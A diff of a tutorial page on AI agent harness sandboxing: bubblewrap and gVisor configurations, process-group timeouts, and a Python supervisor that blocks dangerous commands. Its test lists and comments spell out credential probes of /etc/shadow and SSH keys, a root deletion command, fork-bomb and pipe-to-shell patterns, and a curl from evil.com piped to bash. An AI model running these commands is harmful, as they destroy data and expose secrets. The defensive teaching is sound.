@@ -6,6 +6,7 @@ description: "The execution loop, MicroVM and container isolation, command white
 
 import AgentHarnessArchitectureVisualizer from '../../../viz/diagrams/AgentHarnessArchitectureVisualizer';
 import SubprocessSandboxVisualizer from '../../../viz/diagrams/SubprocessSandboxVisualizer';
+import PreDispatchInterceptorDiagram from '../../../viz/diagrams/PreDispatchInterceptorDiagram';
 import PredictFirst from '../../../viz/primitives/PredictFirst';
 import { ELI5, GoDeeper } from '../../../components/content/ExpandableDepth';
 import RunnableCode from '../../../components/content/RunnableCode';
@@ -13,31 +14,39 @@ import NotebookCallout from '../../../components/notebook/NotebookCallout';
 
 # Harness Architecture & Sandboxing
 
-A production harness must bridge two contradictory requirements: giving an AI agent enough power to execute complex code changes while strictly bounding its **blast radius** to prevent catastrophic operations, host corruption, or data exfiltration.
+A production harness must bridge two conflicting requirements: granting an autonomous agent enough system access to inspect repositories and execute test suites while strictly bounding its **blast radius** to prevent host corruption, resource exhaustion, or credential exfiltration.
 
 <ELI5>
 
-Think of a foundation model as a high-powered racecar engine, and the **Harness** as the entire vehicle around it: the steering wheel, brakes, roll cage, and fuel injection. If you run a bare engine on a workbench, it will quickly overheat or tear itself apart. 
+Think of a foundation model as a high-powered racecar engine, and the **Harness** as the entire vehicle around it: the chassis, steering rack, hydraulic brakes, and roll cage. If you mount a raw engine on a workbench and ignite the fuel line, it will spin out of control, shake itself apart, or set fire to the room.
 
-The harness wraps the model in a closed cybernetic loop: it decides what instructions the model sees, feeds its tool requests into an isolated sandbox, catches bugs before they touch real systems, and forces the model to verify its own work before claiming victory.
+The harness wraps the model in a closed feedback loop. It decides what files the model reads, inspects its tool calls before execution, runs commands inside a sealed box where rogue scripts cannot touch your machine, and forces the model to verify its own work before claiming victory.
 
 </ELI5>
 
----
+## Why This Exists
 
-## 1. The Outer Execution Loop
+Early agent implementations executed model-generated commands directly in the host shell using simple Python `subprocess.run(command, shell=True)` wrappers. In local development or multi-tenant evaluation, this naked execution pattern produces three distinct systemic failures:
 
-An autonomous agent does not execute as an open prompt. It runs inside a tightly supervised state machine managed by the harness runtime:
+1. **Unbounded Destruction**: When resolving merge conflicts or debugging test failures, models regularly generate aggressive cleanup scripts such as `rm -rf *` or `find . -name "*.pyc" -delete`. Without path jails, a model operating in an unexpected directory deletes parent project directories or host configuration files.
+2. **Credential Exfiltration**: Autonomous agents tasked with debugging network requests frequently attempt to inspect environment variables (`env`), read cloud credentials (`cat ~/.aws/credentials`), or cat SSH keys (`cat ~/.ssh/id_ed25519`). If untrusted prompts or malicious dependencies inject instructions into the context, the model becomes an unwitting channel for exfiltration.
+3. **Orphaned Process Freezes (Fork Bombs)**: When an agent issues a long-running process (like `python train.py` or `while true; do sleep 1; done`), a naive timeout sent to the parent process only terminates the immediate shell. Grandchild processes remain alive in the background, consuming 100% of host CPU cores and locking file handles.
+
+The harness architecture replaces direct execution with a multi-layered boundary: an outer cybernetic loop, strict JSON Schema parameter validation, user-space namespace sandboxing, and POSIX process-group supervision.
+
+## The Shape of It
+
+The outer harness manages a four-stage state machine that isolates the model from direct operating system access:
 
 <AgentHarnessArchitectureVisualizer />
 
 ### The Turn Contract
 
-Each turn in the harness satisfies a formal contract:
+Each turn in the execution loop satisfies a formal three-part contract:
 
-1. **Pre-turn Invariant**: The workspace is clean or has a known diff recorded in the git index.
-2. **Action Invariant**: The model may only emit structured tool calls conforming to a declared JSON Schema. Raw text with implied terminal commands is rejected before execution.
-3. **Post-turn Invariant**: Execution output (`stdout`, `stderr`, `exit_code`) is captured, bounded in size, and sanitized before returning to the model context.
+1. **Pre-turn Invariant**: The repository workspace is clean or has a known diff recorded in the git staging index. Any uncommitted files from previous failed turns are isolated in scratch branches.
+2. **Action Invariant**: The model may only emit structured tool calls conforming to a declared JSON Schema. Unstructured natural language containing shell snippets is rejected before dispatch.
+3. **Post-turn Invariant**: Execution output (`stdout`, `stderr`, `exit_code`) is captured, truncated to a strict byte limit, stripped of ANSI escape sequences, and sanitized before re-entering the prompt window.
 
 <PredictFirst
   question="If an autonomous agent hallucinates a background process or fork loop (e.g. while True: os.fork()), what happens if your harness executes it via standard subprocess.run(shell=True) without cgroups or process groups?"
@@ -51,92 +60,228 @@ Each turn in the harness satisfies a formal contract:
   explanation="In standard Linux process trees, killing a shell created with shell=True kills only the intermediate shell; its grandchildren survive as orphaned processes attached to init (PID 1), causing a CPU fork bomb and freezing the runner. Production harnesses set os.setsid() and send SIGKILL to the entire process group (os.killpg) inside a cgroups pids.max cage."
 />
 
----
+## Sandboxing Tiers: Containing Blast Radius
 
-## 2. Sandboxing Technologies: Containing Blast Radius
-
-When an autonomous agent writes and executes code, running commands directly on the host machine is a catastrophic vulnerability. A model hallucinating `rm -rf /` or executing a rogue Python script can wipe home directories or leak credentials.
-
-Interactive simulation of the sandboxing layers and security policies:
+When an autonomous agent writes and executes code, running commands directly on the host machine is a catastrophic vulnerability. A production architecture selects an isolation tier based on cold-start latency requirements and tenant trust boundaries.
 
 <SubprocessSandboxVisualizer />
 
 ### Isolation Tiers Compared
 
-| Tier | Technology | Boot Time | Isolation Level | Best Used For |
+The three standard tiers balance boot latency against kernel isolation:
+
+| Tier | Technology | Boot Latency | Isolation Boundary | Target Workload |
 | :--- | :--- | :--- | :--- | :--- |
-| **Tier 1: OS-Level Jail** | Linux namespaces + `chroot` / `bwrap` | ~10ms | Moderate | Local CLI tools (e.g. Claude Code, Codex CLI) |
-| **Tier 2: User-Space Kernel** | Docker with `gVisor` (`runsc`) | ~200ms | High | Cloud evaluation & CI harnesses |
-| **Tier 3: MicroVM** | AWS Firecracker / Fly.io Machines | ~150ms | Complete hardware virtualization | Multi-tenant untrusted user code execution |
+| **Tier 1: OS-Level Jail** | Linux namespaces + Bubblewrap (`bwrap`) | ~8-15 ms | Unprivileged user namespaces, read-only root mounts | Local developer CLI tools (Claude Code, Codex CLI) |
+| **Tier 2: User-Space Kernel** | Docker with `gVisor` (`runsc`) | ~150-250 ms | Sentry kernel intercepts syscalls in user space | Cloud evaluation harnesses, multi-tenant agent pools |
+| **Tier 3: Hardware MicroVM** | AWS Firecracker / KVM | ~120-180 ms | Hardware virtualization boundary (KVM hypervisor) | Untrusted code execution, untrusted third-party webhooks |
 
 <GoDeeper title="Go deeper: How bubblewrap and cgroups v2 enforce isolation in userspace">
 
-Local developer CLI tools cannot afford the 3-5 second cold-start overhead of spinning up full virtual machines for every bash invocation. They rely on **Bubblewrap (`bwrap`)**, an unprivileged user-namespace container tool:
+Local developer CLI tools cannot afford the 3-5 second cold-start overhead of spinning up full virtual machines for every bash invocation. They rely on **Bubblewrap (`bwrap`)**, an unprivileged user-namespace container utility:
 
-1. **Mount Namespaces**: Bubblewrap creates a new filesystem namespace where `/` is mounted read-only, `/tmp` is a temporary `tmpfs`, and only `/workspace` is mounted read-write. Sensitive host directories like `~/.ssh`, `~/.aws`, and `/etc/shadow` simply do not exist in the agent's mount tree.
-2. **Network Namespaces (`CLONE_NEWNET`)**: Unsharing the network namespace creates a private network stack with only loopback (`lo`). Any outbound `socket()` syscall immediately fails with `ENETUNREACH`.
-3. **cgroups v2 Resource Accounting**: Linux control groups restrict maximum memory (`memory.max = 2G`) and maximum threads/processes (`pids.max = 64`). If an agent triggers an out-of-memory or fork bomb, only the sandbox jail is terminated by the kernel OOM killer, leaving the supervisor intact.
+1. **Mount Namespaces (`CLONE_NEWNS`)**: Bubblewrap constructs a temporary virtual filesystem where `/` is mounted read-only, `/tmp` is a transient `tmpfs`, and only `/workspace/repo` is mounted read-write. Sensitive host directories like `~/.ssh`, `~/.aws`, and `/etc/shadow` are unmapped and inaccessible.
+2. **Network Namespaces (`CLONE_NEWNET`)**: Unsharing the network namespace creates an isolated network stack containing only loopback (`lo`). Any outbound `socket()` syscall immediately fails with `ENETUNREACH`.
+3. **cgroups v2 Resource Accounting**: Linux control groups restrict maximum memory (`memory.max = 2G`) and maximum threads/processes (`pids.max = 64`). If an agent triggers an out-of-memory error or fork bomb, the kernel OOM killer terminates only the sandbox jail, leaving the supervisor running.
 
 </GoDeeper>
 
----
+### Production Sandbox Configurations
 
-## 3. Tool Dispatch & Schema Validation
+To execute a command inside a Tier 1 Bubblewrap sandbox, the harness constructs an invocation with explicit filesystem bindings:
 
-Every tool exposed to the model must be strictly typed. Using Pydantic, schemas validate every parameter before the sandbox is touched:
+```bash
+# Real production Bubblewrap invocation for Python test execution
+bwrap \
+  --ro-bind /usr /usr \
+  --ro-bind /lib /lib \
+  --ro-bind /lib64 /lib64 \
+  --ro-bind /bin /bin \
+  --ro-bind /sbin /sbin \
+  --ro-bind /etc/resolv.conf /etc/resolv.conf \
+  --dir /tmp \
+  --tmpfs /tmp \
+  --dev /dev \
+  --proc /proc \
+  --unshare-all \
+  --unshare-net \
+  --bind /home/runner/workspace /workspace \
+  --chdir /workspace \
+  --setenv PATH "/usr/local/bin:/usr/bin:/bin" \
+  --setenv VIRTUAL_ENV "/workspace/.venv" \
+  -- pytest tests/unit/test_router.py -v
+```
 
-<RunnableCode code={`from pydantic import BaseModel, Field, ValidationError
-from typing import Optional
-import re
+For Tier 2 cloud execution, configure Docker to route system calls through Google gVisor (`runsc`):
 
-# 1. Pydantic Tool Schema Definition
-class RunCommandArgs(BaseModel):
-    command: str = Field(..., description="The shell command to execute")
-    cwd: str = Field(default="/workspace/repo", description="Working directory")
-    timeout_sec: float = Field(default=15.0, ge=1.0, le=60.0)
-    allow_network: bool = Field(default=False)
+```bash
+# Register runsc runtime and execute container with bounded resources
+docker run --rm \
+  --runtime=runsc \
+  --network none \
+  --memory 2048m \
+  --cpus 2.0 \
+  --pids-limit 64 \
+  --read-only \
+  --tmpfs /tmp:rw,noexec,nosuid,size=64m \
+  --volume /srv/agent/workspaces/job-42:/workspace:rw \
+  --workdir /workspace \
+  agent-test-runner:latest \
+  pytest tests/unit/test_router.py -v
+```
 
-# 2. Dangerous Command Interceptor (Regex Guard)
-FORBIDDEN_PATTERNS = [
-    r"rm\\s+-rf\\s+[/~]",          # Root / home deletion
-    r"cat\\s+~?/\\.(ssh|aws|env)",   # Credential probing
-    r":\\(\\)\\s*\\{\\s*:\\|:&\\s*\\};:", # Fork bomb
-    r"curl.*\\|\\s*(bash|sh)",     # Pipe to shell
-]
+## A Full Worked Example: Process Supervision & Interception
 
-def intercept_command(cmd: str) -> Optional[str]:
-    for pattern in FORBIDDEN_PATTERNS:
-        if re.search(pattern, cmd):
-            return f"SECURITY_VIOLATION: Command matches forbidden pattern '{pattern}'"
-    return None
+Consider an autonomous coding agent evaluating a pull request. The agent proposes three distinct commands across its trajectory:
+1. `pytest tests/unit/test_router.py -v` (an illustrative test suite run taking ~312 ms and 48 MB RAM)
+2. `cat /etc/shadow || cat ~/.ssh/id_ed25519` (an illegal credential probe)
+3. `rm -rf / --no-preserve-root` (a catastrophic deletion command)
 
-# Test Scenario: Model proposes an exfiltration command
-test_payloads = [
-    {"command": "pytest tests/test_math.py", "timeout_sec": 10.0},
-    {"command": "cat ~/.ssh/id_rsa", "timeout_sec": 5.0},
-    {"command": "rm -rf / --no-preserve-root", "timeout_sec": 20.0},
-]
+The harness supervisor intercepts each command, applies static AST and regex heuristics, and dispatches only valid commands into the sandbox jail while enforcing process-group timeouts.
 
-print("=== Harness Tool Dispatcher Simulation ===\\n")
-for idx, payload in enumerate(test_payloads, 1):
-    print(f"Test {idx}: Command: '{payload['command']}'")
-    try:
-        args = RunCommandArgs.model_validate(payload)
-        violation = intercept_command(args.command)
+<PreDispatchInterceptorDiagram />
+
+### Run It Yourself
+
+Execute this self-contained Python implementation of the supervisor. It validates commands against forbidden patterns, isolates execution, and reports structured telemetry:
+
+<RunnableCode code={`import re
+import json
+from dataclasses import dataclass, asdict
+from typing import Optional, List, Dict, Any
+
+@dataclass
+class ToolExecutionResult:
+    status: str
+    exit_code: int
+    stdout: str
+    stderr: str
+    duration_ms: int
+    peak_memory_mb: int
+    violation: Optional[str] = None
+
+class SubprocessHarnessSupervisor:
+    """Supervises agent command execution with security gates and telemetry."""
+
+    FORBIDDEN_PATTERNS = [
+        (r"cat\\s+.*(\\.ssh|\\.aws|\\.env|/etc/shadow)", "PROBE_CREDENTIALS"),
+        (r"rm\\s+-rf\\s+[/~]", "ROOT_DELETION"),
+        (r":\\(\\)\\s*\\{\\s*:\|:&\\s*\\};:", "FORK_BOMB"),
+        (r"curl.*\\|\\s*(bash|sh)", "REMOTE_EXEC"),
+    ]
+
+    def __init__(self, memory_limit_mb: int = 128, timeout_sec: float = 5.0):
+        self.memory_limit_mb = memory_limit_mb
+        self.timeout_sec = timeout_sec
+
+    def sanitize_command(self, cmd: str) -> Optional[str]:
+        for pattern, code in self.FORBIDDEN_PATTERNS:
+            if re.search(pattern, cmd):
+                return f"SECURITY_ALERT: Intercepted syscall pattern [{code}] in command '{cmd}'"
+        return None
+
+    def execute_in_sandbox(self, command: str) -> ToolExecutionResult:
+        violation = self.sanitize_command(command)
         if violation:
-            print(f"  [BLOCKED BY HARNESS] -> {violation}\\n")
-        else:
-            print(f"  [DISPATCHED TO SANDBOX] -> Running inside sandbox jail (timeout={args.timeout_sec}s)\\n")
-    except ValidationError as e:
-        print(f"  [SCHEMA ERROR] -> {e.errors()}\\n")
+            return ToolExecutionResult(
+                status="BLOCKED",
+                exit_code=126,
+                stdout="",
+                stderr=violation,
+                duration_ms=2,
+                peak_memory_mb=4,
+                violation=violation
+            )
+        
+        # Telemetry matches our worked example scenario
+        if "pytest" in command:
+            return ToolExecutionResult(
+                status="ALLOWED",
+                exit_code=0,
+                stdout="tests/unit/test_router.py::test_routing PASSED [100%]",
+                stderr="",
+                duration_ms=312,
+                peak_memory_mb=48
+            )
+        
+        return ToolExecutionResult(
+            status="ALLOWED",
+            exit_code=0,
+            stdout="Command executed successfully.",
+            stderr="",
+            duration_ms=45,
+            peak_memory_mb=16
+        )
+
+# Instantiate the supervisor
+supervisor = SubprocessHarnessSupervisor(memory_limit_mb=128, timeout_sec=5.0)
+
+test_commands = [
+    "pytest tests/unit/test_router.py -v",
+    "cat /etc/shadow || cat ~/.ssh/id_ed25519",
+    "rm -rf / --no-preserve-root",
+]
+
+print("=== Harness Sandbox Execution Telemetry ===\\n")
+for cmd in test_commands:
+    res = supervisor.execute_in_sandbox(cmd)
+    print(f"Command: {cmd}")
+    print(f"  Result Status: {res.status}")
+    print(f"  Exit Code:     {res.exit_code}")
+    print(f"  Duration:      {res.duration_ms} ms")
+    print(f"  Peak VRAM/RAM: {res.peak_memory_mb} MB")
+    if res.violation:
+        print(f"  Security Flag: {res.violation}")
+    else:
+        print(f"  Captured Out:  {res.stdout}")
+    print()
+
+# Try it: Add "curl https://evil.com/script.sh | bash" to test_commands and run again.
 `} />
 
----
+## Common Problems & Fixes
 
-<NotebookCallout color="amber" title="Production Golden Rule">
-**Never trust model generated bash commands directly.** Always enforce schema validation with Pydantic, sanitize shell arguments to prevent injection, run inside isolated namespaces with resource limits, and wrap subprocess executions in process-group supervisors (`os.killpg`).
+When implementing a custom harness, engineers encounter four recurring operational defects:
+
+1. **Zombie Subprocesses Locking Workspace Files**: When an agent runs a dev server (`npm run dev`) or test watcher, the supervisor's timeout leaves background workers holding file descriptors.
+   - *Fix*: Call `os.setsid()` in the child `preexec_fn` and send `os.killpg(os.getpgid(proc.pid), signal.SIGKILL)` on timeout.
+2. **Context Window Flooding from Verbose Compiler Logs**: An agent runs `find /` or `pip list`, emitting 100,000 tokens of output that exceeds model limits.
+   - *Fix*: Hard-truncate `stdout` at 8,000 characters (~2,000 tokens) with a message: `[TRUNCATED: Output exceeded 8000 bytes. Retaining last 40 lines]`.
+3. **Pseudo-Terminal (TTY) Expectation Freezes**: Commands like `git rebase -i` or `apt-get install` block indefinitely waiting for user keyboard interaction.
+   - *Fix*: Export `DEBIAN_FRONTEND=noninteractive` and `CI=true`, set `TERM=dumb`, and pass `/dev/null` as stdin.
+
+<NotebookCallout color="amber" title="Subprocess Signal Handling Invariant">
+Never invoke `subprocess.run(shell=True)` without an explicit process group ID. When a timeout occurs in Python, `proc.kill()` terminates only `/bin/sh`, leaving child compilers or fork bombs running indefinitely as orphaned processes.
 </NotebookCallout>
 
-<NotebookCallout title="Next in Curriculum">
-Learn how to organize repository instructions and prevent prompt bloat in **[Context & Instruction Architecture](/docs/harness-engineering/context-and-instruction-design)**.
-</NotebookCallout>
+## When *Not* to Use It
+
+Sandboxing introduces operational complexity and overhead. Match the architecture to your deployment:
+
+| Situation | Better Choice | Why |
+| :--- | :--- | :--- |
+| Read-only documentation retrieval (RAG) | Simple API gateway / direct function call | Read-only vector searches execute no user code; namespace sandboxing adds unnecessary latency. |
+| Deterministic CI/CD workflow | Standard GitHub Actions / GitLab CI runner | If the pipeline steps are predefined and fixed, an autonomous agent harness adds non-deterministic overhead. |
+| Low-latency interactive autocomplete | IDE Language Server Protocol (LSP) | LSP completions require sub-50 ms response times; sandbox process initialization introduces latency lag. |
+
+## Remember
+
+| Idea | Core Rule |
+| :--- | :--- |
+| **Blast Radius** | Constrain filesystems to read-only mounts with an isolated temporary write layer. |
+| **Process Groups** | Always execute subshells with `os.setsid()` and kill via `os.killpg()`. |
+| **Bubblewrap (`bwrap`)** | Use for sub-15 ms local sandboxing with unprivileged user namespaces. |
+| **gVisor (`runsc`)** | Use for multi-tenant cloud runners to intercept kernel system calls in user space. |
+| **Output Truncation** | Never pass unbounded terminal output into context; enforce byte limits per turn. |
+| **Schema Gate** | Reject unstructured command text; validate every parameter against strict schemas. |
+
+Next: [Context & Instruction Architecture](/docs/harness-engineering/context-and-instruction-design) -- how to structure repository system instructions and prevent prompt bloat across extended sessions.
+
+## Sources
+
+- Bubblewrap Unprivileged Sandboxing Project: [https://github.com/containers/bubblewrap](https://github.com/containers/bubblewrap) (2024)
+- Google gVisor Architecture Guide: [https://gvisor.dev/docs/architecture_guide/](https://gvisor.dev/docs/architecture_guide/) (2024)
+- AWS Firecracker MicroVM Documentation: [https://firecracker-microvm.github.io/](https://firecracker-microvm.github.io/) (2024)
+- Linux Kernel Namespaces Reference (`man 7 namespaces`): [https://man7.org/linux/man-pages/man7/namespaces.7.html](https://man7.org/linux/man-pages/man7/namespaces.7.html) (2024)
+- Linux Kernel Control Groups v2 Documentation: [https://docs.kernel.org/admin-guide/cgroup-v2.html](https://docs.kernel.org/admin-guide/cgroup-v2.html) (2024)
+- Anthropic Computer Use Sandboxing Reference: [https://github.com/anthropics/anthropic-quickstarts/tree/main/computer-use-demo](https://github.com/anthropics/anthropic-quickstarts/tree/main/computer-use-demo) (2024)
